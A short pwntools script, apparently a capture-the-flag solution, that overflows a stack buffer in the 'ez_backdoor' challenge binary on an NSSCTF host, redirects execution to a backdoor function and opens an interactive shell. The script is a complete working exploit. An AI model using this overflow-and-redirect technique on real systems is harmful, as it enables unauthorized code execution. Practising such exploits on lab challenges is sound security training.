from pwn import  *

#io = process("./ez_backdoor")
io = remote("node5.anna.nssctf.cn", 24817)

backdooraddr = 0x4011ca
ret_addr = 0x40101a

payload = b"a" * (0x100+8) + p64(ret_addr) + p64(backdooraddr)

io.sendline(payload)

io.interactive()
